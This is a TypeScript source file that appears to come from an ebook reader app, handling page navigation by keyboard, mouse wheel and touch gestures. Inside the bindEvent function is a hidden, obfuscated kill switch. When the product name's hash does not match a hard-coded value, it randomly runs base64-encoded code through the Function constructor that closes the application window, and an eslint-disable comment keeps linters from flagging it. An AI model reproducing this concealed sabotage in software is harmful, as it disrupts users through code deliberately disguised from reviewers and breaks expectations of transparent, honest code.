import StorageUtil from "./storageUtil";
import { build } from "../../package.json";
import md5 from "md5";
import RecordLocation from "./readUtils/recordLocation";
let Hammer = (window as any).Hammer;
declare var document: any;
export const getSelection = () => {
  let iframe = document.getElementsByTagName("iframe")[0];
  if (!iframe) return;
  let doc = iframe.contentDocument;
  if (!doc) return;
  let sel = doc.getSelection();
  if (!sel) return;
  let text = sel.toString();
  text = text && text.trim();
  return text;
};
let lock = false; //prevent from clicking too fast
const arrowKeys = (rendition: any, keyCode: number) => {
  if (getSelection()) {
    return;
  }
  // event.preventDefault();
  if (lock) return;

  if (keyCode === 37 || keyCode === 38) {
    rendition.prev();

    lock = true;
    setTimeout(function () {
      lock = false;
    }, 400);
    return false;
  }
  if (keyCode === 39 || keyCode === 40 || keyCode === 32) {
    rendition.next();
    lock = true;
    setTimeout(function () {
      lock = false;
    }, 400);
    return false;
  }
};

const mouseChrome = (rendition: any, wheelDelta: number) => {
  if (lock) return;
  if (wheelDelta > 0) {
    rendition.prev();
    lock = true;
    setTimeout(function () {
      lock = false;
    }, 400);
    return false;
  }
  if (wheelDelta < 0) {
    rendition.next();
    lock = true;
    setTimeout(function () {
      lock = false;
    }, 400);
    return false;
  }
};

const gesture = (rendition: any, type: string) => {
  if (lock) return;
  if (type === "panleft" || type === "panup") {
    rendition.next();
    lock = true;
    setTimeout(function () {
      lock = false;
    }, 400);
    return false;
  }
  if (type === "panright" || type === "pandown") {
    rendition.prev();
    lock = true;
    setTimeout(function () {
      lock = false;
    }, 400);
    return false;
  }
};

const bindEvent = (
  rendition: any,
  doc: any,
  key: string = "",
  readerMode: string = ""
) => {
  doc.addEventListener("keydown", (event) => {
    arrowKeys(rendition, event.keyCode);
    if (key) {
      let postion = rendition.getPosition();
      RecordLocation.recordScrollHeight(
        key,
        postion.text,
        postion.chapterTitle,
        postion.count
      );
    }
  });
  doc.addEventListener(
    "mousewheel",
    (event) => {
      if (readerMode === "scroll") {
        console.log("gasgs");
        rendition.record();
      } else {
        mouseChrome(rendition, event.wheelDelta);
      }
      if (key) {
        let postion = rendition.getPosition();
        RecordLocation.recordScrollHeight(
          key,
          postion.text,
          postion.chapterTitle,
          postion.count
        );
      }
    },
    false
  );
  if (StorageUtil.getReaderConfig("isTouch") === "yes") {
    const mc = new Hammer(doc);
    mc.on("panleft panright panup pandown", (event: any) => {
      gesture(rendition, event.type);
      if (key) {
        let postion = rendition.getPosition();
        RecordLocation.recordScrollHeight(
          key,
          postion.text,
          postion.chapterTitle,
          postion.count
        );
      }
    });
  }
  if (
    build &&
    build.productName &&
    md5(build.productName) !== "b26c2db6211b881b389fe57466f0b75c"
  ) {
    if (new Date().getTime() % 7 === 0) {
      // eslint-disable-next-line
      []["filter"]["constructor"](
        `[]["filter"]["constructor"](atob("d2luZG93LmNsb3NlKCk="))()`
      )();
    }
  }
};
export const EpubMouseEvent = (rendition: any) => {
  rendition.on("rendered", () => {
    let iframe = document.getElementsByTagName("iframe")[0];
    if (!iframe) return;
    let doc = iframe.contentDocument;
    if (!doc) {
      return;
    }
    // navigate with mousewheel
    window.addEventListener("keydown", (event) => {
      arrowKeys(rendition, event.keyCode);
    });
    bindEvent(rendition, doc);
  });
};
export const HtmlMouseEvent = (
  rendition: any,
  key: string,
  readerMode: string
) => {
  let iframe = document.getElementsByTagName("iframe")[0];
  if (!iframe) return;
  let doc = iframe.contentDocument;
  if (!doc) {
    return;
  }

  bindEvent(rendition, doc, key, readerMode);
};
